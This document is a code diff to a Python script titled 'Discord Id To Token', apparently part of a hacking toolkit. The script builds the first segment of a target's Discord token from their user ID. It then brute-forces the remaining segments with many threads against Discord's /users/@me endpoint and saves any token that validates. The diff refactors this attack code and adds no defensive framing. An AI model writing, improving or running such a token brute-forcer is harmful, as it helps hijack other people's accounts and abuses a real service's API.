@@ -1,4 +1,4 @@
-# Copyright (c) 2025 v4lkyr0/v4lkyr_
+# Copyright (c) 2025 v4lkyr0
 # See LICENSE file for details
 
 from Plugins.Utils import *
@@ -18,15 +18,15 @@ Title("Discord Id To Token")
 Connection()
 
 try:
-    user_id = input(f"{INPUT} Enter Discord User Id {red}->{reset} ").strip()
+    user_id = input(f"{INPUT} Enter User Id {red}->{reset} ").strip()
     if not user_id.isdigit():
         ErrorId()
 
-    first_part = str(base64.b64encode(user_id.encode("utf-8")), "utf-8").replace("=", "")
+    first_part = base64.b64encode(user_id.encode("utf-8")).decode("utf-8").replace("=", "")
     print(f"{INFO} First Part of Token:{red} {first_part}", reset)
 
     find_token = input(f"{INPUT} Find the Token? {YESORNO} {red}->{reset} ").strip().lower()
-    if not find_token in ['y', 'yes']:
+    if find_token not in ['y', 'yes']:
         Continue()
         Reset()
 
@@ -38,24 +38,22 @@ try:
     print(f"{LOADING} Brute Force of the Token..", reset)
 
     token_found = threading.Event()
-    found_token = None
+    found_token = [None]
 
     def TokenCheck():
-        global found_token
-
         if token_found.is_set():
             return
 
-        first_part_token  = first_part
-        second_part_token = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(6))
-        third_part_token  = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(38))
-        all_parts_token   = f"{first_part_token}.{second_part_token}.{third_part_token}"
+        second_part_token = ''.join(random.choice(string.ascii_letters + string.digits + '-_') for _ in range(6))
+        third_part_token  = ''.join(random.choice(string.ascii_letters + string.digits + '-_') for _ in range(38))
+        all_parts_token   = f"{first_part}.{second_part_token}.{third_part_token}"
 
         try:
             response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': all_parts_token, 'Content-Type': 'application/json'})
             if response.status_code == 200:
+                found_token[0] = all_parts_token
+                token_found.set()
                 print(f"{SUCCESS} Status:{red} Valid   {white}| Token:{red} {all_parts_token}", reset)
-                token_found.set()  
             else:
                 print(f"{ERROR} Status:{red} Invalid {white}| Token:{red} {all_parts_token}", reset)
         except:
@@ -73,17 +71,16 @@ try:
                 time.sleep(0.1)
         except:
             ErrorNumber()
-
         for thread in threads:
             thread.join()
 
     while not token_found.is_set():
         Request()
 
-    if found_token:
-        SaveToken(found_token)
+    if found_token[0]:
+        SaveToken(found_token[0])
         print(f'{INFO} Token saved in {red}"{white}Programs/Extras/DiscordTokens.txt{red}"{white}.', reset)
-    
+
     Continue()
     Reset()
 
